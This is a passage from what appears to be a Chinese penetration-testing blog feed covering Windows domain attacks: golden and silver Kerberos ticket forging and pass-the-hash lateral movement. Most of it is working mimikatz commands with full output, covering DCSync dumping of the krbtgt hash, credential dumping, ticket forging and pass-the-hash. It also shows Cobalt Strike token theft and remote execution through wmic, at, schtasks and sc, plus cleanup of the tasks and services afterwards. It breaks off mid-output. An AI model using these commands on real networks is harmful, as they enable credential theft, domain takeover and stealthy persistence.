class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># log</span></span><br><span class="line">Using <span class="string">&#x27;mimikatz.log&#x27;</span> <span class="keyword">for</span> logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># kerberos::golden /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693  /target:win2008.lab.com /rc4:f78dd9e2f973830056e39dff42af4930  /service:cifs /user:mary /ptt</span></span><br><span class="line">User      : mary</span><br><span class="line">Domain    : lab.com (LAB)</span><br><span class="line">SID       : S-1-5-21-1799307087-3941118632-1964125693</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519 </span><br><span class="line">ServiceKey: f78dd9e2f973830056e39dff42af4930 - rc4_hmac_nt      </span><br><span class="line">Service   : cifs</span><br><span class="line">Target    : 192.168.100.37</span><br><span class="line">Lifetime  : 2021/12/19 14:57:51 ; 2031/12/17 14:57:51 ; 2031/12/17 14:57:51</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;mary @ lab.com&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br></pre></td></tr></table></figure><p>可成功访问win2008的机器，后续利用参考wmic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;dir \\win2008\c$</span><br><span class="line"> 驱动器 \\win2008\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 A09D-7ABE</span><br><span class="line"></span><br><span class="line"> \\win2008\c$ 的目录</span><br><span class="line"></span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/08/23  18:27    &lt;DIR&gt;          Program Files</span><br><span class="line">2009/07/14  13:06    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2021/12/14  22:38    &lt;DIR&gt;          Users</span><br><span class="line">2021/08/23  20:40    &lt;DIR&gt;          Windows</span><br><span class="line">2021/12/16  15:25                59 新建文本文档.txt</span><br><span class="line">               1 个文件             59 字节</span><br><span class="line">               5 个目录 30,594,490,368 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;whoami</span><br><span class="line">lab\cve-test</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;hostname</span><br><span class="line">win7</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;klist</span><br><span class="line"></span><br><span class="line">当前登录 ID 是 0:0x5028a</span><br><span class="line"></span><br><span class="line">缓存的票证: (2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     客户端: mary @ lab.com</span></span><br><span class="line">        服务器: cifs/win2008.lab.com @ lab.com</span><br><span class="line">        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        票证标志 0x40a00000 -&gt; forwardable renewable pre_authent</span><br><span class="line">        开始时间: 12/19/2021 15:12:39 (本地)</span><br><span class="line">        结束时间:   12/17/2031 15:12:39 (本地)</span><br><span class="line">        续订时间: 12/17/2031 15:12:39 (本地)</span><br><span class="line">        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        </span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;</span><br></pre></td></tr></table></figure><h3 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a>黄金票据（Golden ticket）</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>Golden ticket的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能够让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</strong></p><p>伪造黄金凭据需要具备下面条件：</p><ul><li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li><li>域名称</li><li>域的SID值</li><li>要伪造的用户名</li></ul><p>登陆域控，dump krbtgt用户的hash值，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /dc01.lab.com /all</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># log</span></span><br><span class="line">Using <span class="string">&#x27;mimikatz.log&#x27;</span> <span class="keyword">for</span> logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /dc01.lab.com /all</span></span><br><span class="line">[DC] <span class="string">&#x27;lab.com&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.lab.com&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;lab.com&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Object Security ID   : S-1-5-21-1799307087-3941118632-1964125693-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 392ffcfeacc6914f5a2e4d3f7893457d</span><br><span class="line"></span><br><span class="line">Object RDN           : Read-only Domain Controllers</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Read-only Domain Controllers</span><br><span class="line">Object Security ID   : S-1-5-21-1799307087-3941118632-1964125693-521</span><br><span class="line">Object Relative ID   : 521</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>进行ptt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ticket:golden.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1</span></span><br><span class="line">799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt</span><br><span class="line">User      : administrator</span><br><span class="line">Domain    : lab.com (LAB)</span><br><span class="line">SID       : S-1-5-21-1799307087-3941118632-1964125693</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519</span><br><span class="line">ServiceKey: 392ffcfeacc6914f5a2e4d3f7893457d - rc4_hmac_nt</span><br><span class="line">Lifetime  : 2021/12/19 15:30:40 ; 2031/12/17 15:30:40 ; 2031/12/17 15:30:40</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;administrator @ lab.com&#x27;</span> successfully submitted <span class="keyword">for</span> current s</span><br><span class="line">ession</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;klist</span><br><span class="line"></span><br><span class="line">当前登录 ID 是 0:0x5028a</span><br><span class="line"></span><br><span class="line">缓存的票证: (1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     客户端: administrator @ lab.com</span></span><br><span class="line">        服务器: krbtgt/lab.com @ lab.com</span><br><span class="line">        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        票证标志 0x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        开始时间: 12/19/2021 15:30:40 (本地)</span><br><span class="line">        结束时间:   12/17/2031 15:30:40 (本地)</span><br><span class="line">        续订时间: 12/17/2031 15:30:40 (本地)</span><br><span class="line">        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;dir \\dc01.lab.com\c$</span><br><span class="line"> 驱动器 \\dc01.lab.com\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C219-9288</span><br><span class="line"></span><br><span class="line"> \\dc01.lab.com\c$ 的目录</span><br><span class="line"></span><br><span class="line">2021/10/23  20:12    &lt;JUNCTION&gt;     $SNAP_202110232011_VOLUMEC$ [\??\Volume&#123;2069</span><br><span class="line">70b5-33f3-11ec-80bd-000c29ed4c86&#125;\]</span><br><span class="line">2021/12/11  20:27    &lt;JUNCTION&gt;     $SNAP_202112112026_VOLUMEC$ [\??\Volume&#123;aab2</span><br><span class="line">c429-3950-11ec-80c2-000c29ed4c86&#125;\]</span><br><span class="line">2021/12/11  20:26        20,987,904 ntds.dit</span><br><span class="line">2013/08/22  23:52    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/08/23  20:36    &lt;DIR&gt;          Program Files</span><br><span class="line">2013/08/22  23:39    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2021/12/11  20:31        12,935,168 system</span><br><span class="line">2021/08/23  19:57    &lt;DIR&gt;          Users</span><br><span class="line">2021/09/26  11:20    &lt;DIR&gt;          Windows</span><br><span class="line">               2 个文件     33,923,072 字节</span><br><span class="line">               7 个目录 49,284,296,704 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">https://www.cnblogs.com/bmjoker/p/10355979.html</a></p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网PTH</title>
      <link href="/2021/12/20/%E5%86%85%E7%BD%91PTH/"/>
      <url>/2021/12/20/%E5%86%85%E7%BD%91PTH/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>pass-the-hash在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p><span id="more"></span><p>pass the hash原理：</p><ul><li>在Windows系统中，通常会使用NTLM身份认证</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash</li><li>如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)</li></ul><p>这类攻击适用于：</p><ul><li>域/工作组环境</li><li>可以获得hash，但是条件不允许对hash爆破</li><li>内网中存在和当前机器相同的密码</li></ul><p>微软也对pth打过补丁，然而在测试中发现，在打了补丁后，常规的Pass The Hash已经无法成功，唯独默认的Administrator(SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程ipc连接。</p><p>如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。</p><p>从windows到windows横向pth这一类攻击方法比较广泛</p><h3 id="Mimikatz抓取密码"><a href="#Mimikatz抓取密码" class="headerlink" title="Mimikatz抓取密码"></a>Mimikatz抓取密码</h3><blockquote><p>shell mimi.exe log “privilege::debug” “sekurlsa::logonpasswords” exit</p></blockquote><h3 id="Mimikatz-PTH"><a href="#Mimikatz-PTH" class="headerlink" title="Mimikatz PTH"></a>Mimikatz PTH</h3><p>mimikatz 中的一个隐藏宝石是它能够根据用户名和密码哈希创建信任关系。这是执行此操作的 mimikatz 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell mimi.exe <span class="string">&quot;sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND&quot;</span></span><br><span class="line"></span><br><span class="line">shell mimi.exe <span class="string">&quot;sekurlsa::pth /user:it /domain:TEST /ntlm:dbe09bxxxxxx9c8c7f109f65bac&quot;</span></span><br></pre></td></tr></table></figure><p>在实践中，生成一个新的有效载荷来传递哈希是一种痛苦。生成虚假进程（例如，calc.exe）并窃取其令牌要容易得多。</p><p>CS的 steal_token 命令将模拟来自另一个进程的令牌。从我们的虚假流程中窃取的令牌将继续引用您提供的用户名、域和密码哈希。与远程资源交互的任何操作，而 Beacon 持有此令牌，将为我们传递哈希值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token [PID]</span><br></pre></td></tr></table></figure><p>使用shell dir \TARGET\C$ 检查权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell dir \\TARGET\c$</span><br><span class="line">[*] Tasked beacon to run: dir \\TARGET\c$</span><br><span class="line">[+] host called home, sent: 52 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> Volume <span class="keyword">in</span> drive \\TARGET\c$ has no label.</span><br><span class="line"> Volume Serial Number is 00EE-EB32</span><br></pre></td></tr></table></figure><h3 id="横向移动方法"><a href="#横向移动方法" class="headerlink" title="横向移动方法"></a>横向移动方法</h3><p>1.将需要的工具或exe通过copy的方式传到目标机器</p><p>2.远程命令执行（WMIC、AT、SCHTASKS、SC）</p><h4 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h4><p>可以使用<a href="https://isc.sans.edu/diary/The+Grammar+of+WMIC/2376">wmic</a>在远程主机上运行进程。这是执行此操作的语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic /node: host process call create “c:\windows\temp\ foobar.exe ”</span><br></pre></td></tr></table></figure><h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><p>您还可以安排一个程序与 at 一起运行。该<a href="http://support.microsoft.com/kb/313565">AT命令</a>是由Windows 8弃用您将无法使用此选项从或对Windows 8的目标。也就是说，此选项的语法很容易记住。</p><p>首先，找出远程系统上的时间，接下来，使用at安排foobar.exe在不久的将来某个时间运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net time \\host</span><br><span class="line">shell at \\host HH:MM c:\windows\temp\foobar.exe</span><br></pre></td></tr></table></figure><h4 id="SCHTASKS"><a href="#SCHTASKS" class="headerlink" title="SCHTASKS"></a>SCHTASKS</h4><p>在目标系统上运行代码的另一个选项是 <a href="http://technet.microsoft.com/en-us/library/cc725744.aspx">schtasks</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System</span><br><span class="line">shell schtasks /run /tn foobar /S host</span><br></pre></td></tr></table></figure><p>你应该在它执行后清理你的任务。这是执行此操作的语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /F /delete /tn foobar /S host</span><br></pre></td></tr></table></figure><h4 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h4><p>在远程主机上执行程序的第四个选项是创建一个服务并启动它。您可以使用<a href="http://technet.microsoft.com/en-us/library/cc754599.aspx">sc 命令</a>来执行此操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”</span><br><span class="line">shell sc \\host start foobar</span><br></pre></td></tr></table></figure><p>sc 命令需要响应服务控制管理器命令的可执行文件。如果您不提供这样的可执行文件，您的程序将运行，然后立即退出。Cobalt Strike 用于生成暂存可执行文件的对话框为您提供了生成服务可执行文件的选项。确保你注意这个细节。</p><p>以下是在服务运行后删除服务的语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\host delete foobar</span><br></pre></td></tr></table></figure><h3 id="完整记录"><a href="#完整记录" class="headerlink" title="完整记录"></a>完整记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell mimi.exe <span class="string">&quot;sekurlsa::pth /user:test /domain:TEST.COM /ntlm:4ff977a6aexxxxxxxxx5eb286af790b&quot;</span></span><br><span class="line">[*] Tasked beacon to run: mimi.exe <span class="string">&quot;sekurlsa::pth /user:test /domain:TEST.COM /ntlm:4ff977a6aexxxxxxxxx5eb286af790b&quot;</span></span><br><span class="line">[+] host called home, sent: 123 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::pth /user:test /domain:TEST.COM /ntlm:4ff977a6aexxxxxxxxx5eb286af790b</span></span><br><span class="line">user: <span class="built_in">test</span></span><br><span class="line">domain: TEST.COM</span><br><span class="line">program: cmd.exe</span><br><span class="line">impers.: no</span><br><span class="line">NTLM: 4ff977a6aexxxxxxxxx5eb286af790b</span><br><span class="line">  |  PID  8572</span><br><span class="line">  |  TID  17812</span><br><span class="line">  |  LSA Process is now R/W</span><br><span class="line">  |  LUID 1 ; 1401080865 (00000001:5382cc21)</span><br><span class="line">  \_ msv1_0   - data copy @ 000001D56F74E560 : OK !</span><br><span class="line">  \_ kerberos - data copy @ 000001D5716E0BD8</span><br><span class="line">   \_ aes256_hmac       -&gt; null             </span><br><span class="line">   \_ aes128_hmac       -&gt; null             </span><br><span class="line">   \_ rc4_hmac_nt       OK</span><br><span class="line">   \_ rc4_hmac_old      OK</span><br><span class="line">   \_ rc4_md4           OK</span><br><span class="line">   \_ rc4_hmac_nt_exp   OK</span><br><span class="line">   \_ rc4_hmac_old_exp  OK</span><br><span class="line">   \_ *Password replace @ 000001D5725F1A18 (32) -&gt; null</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># </span></span><br><span class="line">beacon&gt; steal_token 8572</span><br><span class="line">[*] Tasked beacon to steal token from PID 8572</span><br><span class="line">[+] host called home, sent: 12 bytes</span><br><span class="line">[+] Impersonated NT AUTHORITY\SYSTEM</span><br><span class="line">beacon&gt; shell dir \\TARGET\c$</span><br><span class="line">[*] Tasked beacon to run: dir \\TARGET\c$</span><br><span class="line">[+] host called home, sent: 52 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> Volume <span class="keyword">in</span> drive \\TARGET\c$ has no label.</span><br><span class="line"> Volume Serial Number is 00EE-EB32</span><br><span class="line"></span><br><span class="line">beacon&gt; shell copy 91695d7b-04b0-406f-a5c6-a6d1a7b939fc.exe \\TARGET\C$\windows</span><br><span class="line">[*] Tasked beacon to run: copy 91695d7b-04b0-406f-a5c6-a6d1a7b939fc.exe \\TARGET\C$\windows</span><br><span class="line">[+] host called home, sent: 102 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">beacon&gt; shell wmic /node:TARGET process call create <span class="string">&quot;c:\windows\91695d7b-04b0-406f-a5c6-a6d1a7b939fc.exe&quot;</span></span><br><span class="line">[*] Tasked beacon to run: wmic /node:TARGET process call create <span class="string">&quot;c:\windows\91695d7b-04b0-406f-a5c6-a6d1a7b939fc.exe&quot;</span></span><br><span class="line">[+] host called home, sent: 128 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Executing 